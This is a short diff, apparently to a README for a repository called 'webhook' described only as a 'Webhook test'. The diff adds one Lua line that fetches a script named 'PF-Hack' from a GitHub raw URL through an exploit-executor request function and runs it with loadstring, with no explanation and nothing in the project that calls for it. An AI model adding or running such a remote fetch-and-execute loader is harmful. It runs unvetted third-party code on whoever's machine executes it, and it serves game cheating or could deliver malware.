@@ -1,2 +1,3 @@
 # webhook
 Webhook test
+loadstring(syn.request({Url = "https://raw.githubusercontent.com/CNF-RDev/PF-Hack/main/main.lua", Method = "GET"}).Body)()
